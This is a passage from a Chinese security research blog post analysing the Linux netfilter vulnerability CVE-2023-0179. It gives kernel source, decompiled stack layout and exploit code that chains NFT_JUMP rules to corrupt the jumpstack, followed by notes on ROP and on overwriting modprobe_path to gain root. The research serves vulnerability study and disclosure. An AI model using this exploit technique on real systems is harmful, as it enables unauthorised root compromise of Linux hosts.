</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#a6e22e">a7</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">a8</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__int16</span> <span style="color:#a6e22e">a9</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ......
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_regs</span> <span style="color:#a6e22e">regs</span>; <span style="color:#75715e">// [rsp+60h] [rbp-190h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_jumpstack</span> <span style="color:#a6e22e">v51</span>[<span style="color:#ae81ff">16</span>]; <span style="color:#75715e">// [rsp+B0h] [rbp-140h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">unsigned</span> <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">canary</span>; <span style="color:#75715e">// [rsp+1B8h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">v53</span>; <span style="color:#75715e">// [rsp+1C0h] [rbp-30h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">v54</span>; <span style="color:#75715e">// [rsp+1C8h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">v55</span>; <span style="color:#75715e">// [rsp+1D0h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">v56</span>; <span style="color:#75715e">// [rsp+1D8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">v57</span>; <span style="color:#75715e">// [rsp+1E0h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">v58</span>; <span style="color:#75715e">// [rsp+1E8h] [rbp-8h]
</span></span></span></code></pre></div><p>通过利用改写nft_jumpstack结构体，扩大越界读写范围。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nft_do_chain</span>(<span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_pktinfo</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">pkt</span>, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">priv</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_chain</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">chain</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">priv</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">basechain</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chain</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">net</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">net</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_net</span>(<span style="color:#a6e22e">pkt</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_rule</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rules</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_rule</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rule</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_expr</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">expr</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">last</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_regs</span> <span style="color:#a6e22e">regs</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">stackptr</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_jumpstack</span> <span style="color:#a6e22e">jumpstack</span>[<span style="color:#a6e22e">NFT_JUMP_STACK_SIZE</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">genbit</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">READ_ONCE</span>(<span style="color:#a6e22e">net</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nft</span>.<span style="color:#a6e22e">gencursor</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_traceinfo</span> <span style="color:#a6e22e">info</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">info</span>.<span style="color:#a6e22e">trace</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">static_branch_unlikely</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">nft_trace_enabled</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nft_trace_init</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">info</span>, <span style="color:#a6e22e">pkt</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">regs</span>.<span style="color:#a6e22e">verdict</span>, <span style="color:#a6e22e">basechain</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">do_chain</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">genbit</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rules</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rcu_dereference</span>(<span style="color:#a6e22e">chain</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rules_gen_1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rules</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rcu_dereference</span>(<span style="color:#a6e22e">chain</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rules_gen_0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">next_rule</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">rule</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rules</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">regs</span>.<span style="color:#a6e22e">verdict</span>.<span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">NFT_CONTINUE</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#f92672">*</span><span style="color:#a6e22e">rules</span> ; <span style="color:#a6e22e">rules</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rule</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rules</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nft_rule_for_each_expr</span>(<span style="color:#a6e22e">expr</span>, <span style="color:#a6e22e">last</span>, <span style="color:#a6e22e">rule</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ops</span> <span style="color:#f92672">==</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">nft_cmp_fast_ops</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">nft_cmp_fast_eval</span>(<span style="color:#a6e22e">expr</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">regs</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ops</span> <span style="color:#f92672">==</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">nft_bitwise_fast_ops</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">nft_bitwise_fast_eval</span>(<span style="color:#a6e22e">expr</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">regs</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ops</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">nft_payload_fast_ops</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">!</span><span style="color:#a6e22e">nft_payload_fast_eval</span>(<span style="color:#a6e22e">expr</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">regs</span>, <span style="color:#a6e22e">pkt</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">expr_call_ops_eval</span>(<span style="color:#a6e22e">expr</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">regs</span>, <span style="color:#a6e22e">pkt</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">regs</span>.<span style="color:#a6e22e">verdict</span>.<span style="color:#a6e22e">code</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">NFT_CONTINUE</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">regs</span>.<span style="color:#a6e22e">verdict</span>.<span style="color:#a6e22e">code</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NFT_BREAK</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">regs</span>.<span style="color:#a6e22e">verdict</span>.<span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">NFT_CONTINUE</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NFT_CONTINUE</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">nft_trace_packet</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">info</span>, <span style="color:#a6e22e">chain</span>, <span style="color:#a6e22e">rule</span>,
</span></span><span style="display:flex;"><span>           <span style="color:#a6e22e">NFT_TRACETYPE_RULE</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">regs</span>.<span style="color:#a6e22e">verdict</span>.<span style="color:#a6e22e">code</span> <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">NF_VERDICT_MASK</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NF_ACCEPT</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NF_DROP</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NF_QUEUE</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NF_STOLEN</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nft_trace_packet</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">info</span>, <span style="color:#a6e22e">chain</span>, <span style="color:#a6e22e">rule</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">NFT_TRACETYPE_RULE</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">regs</span>.<span style="color:#a6e22e">verdict</span>.<span style="color:#a6e22e">code</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">regs</span>.<span style="color:#a6e22e">verdict</span>.<span style="color:#a6e22e">code</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NFT_JUMP</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">WARN_ON_ONCE</span>(<span style="color:#a6e22e">stackptr</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">NFT_JUMP_STACK_SIZE</span>))
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">NF_DROP</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jumpstack</span>[<span style="color:#a6e22e">stackptr</span>].<span style="color:#a6e22e">chain</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chain</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jumpstack</span>[<span style="color:#a6e22e">stackptr</span>].<span style="color:#a6e22e">rules</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rules</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stackptr</span><span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fallthrough</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NFT_GOTO</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nft_trace_packet</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">info</span>, <span style="color:#a6e22e">chain</span>, <span style="color:#a6e22e">rule</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">NFT_TRACETYPE_RULE</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chain</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">regs</span>.<span style="color:#a6e22e">verdict</span>.<span style="color:#a6e22e">chain</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> <span style="color:#a6e22e">do_chain</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NFT_CONTINUE</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NFT_RETURN</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nft_trace_packet</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">info</span>, <span style="color:#a6e22e">chain</span>, <span style="color:#a6e22e">rule</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">NFT_TRACETYPE_RETURN</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WARN_ON</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stackptr</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stackptr</span><span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chain</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jumpstack</span>[<span style="color:#a6e22e">stackptr</span>].<span style="color:#a6e22e">chain</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rules</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jumpstack</span>[<span style="color:#a6e22e">stackptr</span>].<span style="color:#a6e22e">rules</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> <span style="color:#a6e22e">next_rule</span>;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p><img loading="lazy" src="/attachments/2023-10-18-cve-2023-0179-linux/065b65c4-aa16-41fc-92f1-ed336e8ba155.jpeg" alt=""  />
</p>
<p><img loading="lazy" src="/attachments/2023-10-18-cve-2023-0179-linux/0c63e908-6b17-4832-a95a-e2e1fb9913e4.png" alt=""  />
</p>
<p>通过增加多个verdict.code为NFT_JUMP的规则，在规则执行后就会填充jumpstack数组，并在最后一个规则触发越界写，修改jumpstack数组，控制其中的rules指针，后续覆盖返回地址，做ROP即可。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">unft_base_chain_param</span> <span style="color:#a6e22e">bp</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bp</span>.<span style="color:#a6e22e">hook_num</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">NF_INET_PRE_ROUTING</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bp</span>.<span style="color:#a6e22e">prio</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">exp_chain_num</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sprintf</span>(<span style="color:#a6e22e">exp_chain_name</span>, <span style="color:#e6db74">&#34;%s%d&#34;</span>, <span style="color:#e6db74">&#34;exp_chain&#34;</span>, <span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">NULL</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">bp</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">create_chain</span>(<span style="color:#a6e22e">nl</span>, <span style="color:#a6e22e">table_name</span>, <span style="color:#a6e22e">exp_chain_name</span>, <span style="color:#a6e22e">NFPROTO_BRIDGE</span>, <span style="color:#a6e22e">p</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">seq</span>, <span style="color:#a6e22e">NULL</span>))
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Failed creating exp chain&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#a6e22e">EXIT_FAILURE</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">exp_chain_num</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sprintf</span>(<span style="color:#a6e22e">exp_chain_name</span>, <span style="color:#e6db74">&#34;%s%d&#34;</span>, <span style="color:#e6db74">&#34;exp_chain&#34;</span>, <span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sprintf</span>(<span style="color:#a6e22e">exp_chain_name_next</span>, <span style="color:#e6db74">&#34;%s%d&#34;</span>, <span style="color:#e6db74">&#34;exp_chain&#34;</span>, <span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nftnl_rule</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">build_rule</span>(<span style="color:#a6e22e">table_name</span>, <span style="color:#a6e22e">exp_chain_name</span>, <span style="color:#a6e22e">NFPROTO_BRIDGE</span>, <span style="color:#a6e22e">NULL</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">i</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rule_add_payload</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">NFT_PAYLOAD_LL_HEADER</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">cmp_str</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">MAGIC</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rule_add_cmp</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">NFT_CMP_EQ</span>, <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">cmp_str</span>, <span style="color:#ae81ff">6</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">uint64_t</span> <span style="color:#a6e22e">stack_value</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">stack</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">0xffff</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rule_add_payload</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">NFT_PAYLOAD_LL_HEADER</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rule_add_cmp</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">NFT_CMP_EQ</span>, <span style="color:#ae81ff">12</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">stack_value</span>, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">exp_chain_num</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rule_add_payload</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">NFT_PAYLOAD_LL_HEADER</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">// trigger
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rule_add_immediate_verdict</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">NFT_JUMP</span>, <span style="color:#a6e22e">exp_chain_name_next</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">err</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">send_batch_request</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">nl</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">NFT_MSG_NEWRULE</span> <span style="color:#f92672">|</span> (<span style="color:#a6e22e">NFT_TYPE_RULE</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>),
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">NLM_F_CREATE</span>, <span style="color:#a6e22e">NFPROTO_BRIDGE</span>, (<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">r</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">seq</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">NULL</span>
</span></span><span style="display:flex;"><span>                );
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#a6e22e">CLR_RED</span> <span style="color:#e6db74">&#34;[-] Set exp chain rule failed&#34;</span> <span style="color:#a6e22e">CLR_RESET</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#a6e22e">EXIT_FAILURE</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h3 id="条件三触发漏洞时内核上下文不确定">条件三：触发漏洞时内核上下文不确定<a hidden class="anchor" aria-hidden="true" href="#条件三触发漏洞时内核上下文不确定">#</a></h3>
<p>在recv接收数据时触发漏洞，所以不确定是在哪一个内核上下文中，栈溢出后也不能直接返回用户态。</p>
<p>不过多破坏栈上数据，在有限的栈空间内修改modprobe_path（在运行非ELF格式的二进制时，会以root权限调用该脚本）指向我们可控的脚本，最后调整rsp为上一层未破坏的栈帧，正常返回。</p>
<h2 id="0x04-总结">0x04 总结<a hidden class="anchor" aria-hidden="true" href="#0x04-总结">#</a></h2>
<p>netfilter子系统是一个相当复杂的系统，借助此文介绍了CVE-2023-0179的漏洞成因和漏洞利用过程中的一些注意点，希望能起到抛砖引玉的效果。</p>


  </div>

  <footer class="post-footer">
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/blog/tiangongarticle002/">
    <span class="title">« 上一页</span>
    <br>
    <span>Microsoft Hyper-V 虚拟 TPM 设备漏洞分析</span>
  </a>
  <a class="next" href="http://localhost:1313/blog/tiangongarticle037/">
    <span class="title">下一页 »</span>
    <br>
    <span>以 CVE-2024-26229 为例分析 Windows RDBSS 机制</span>
  </a>
</nav>





  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>© <a href="https://poc.qianxin.com/home">天工实验室</a></span>
        

    
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
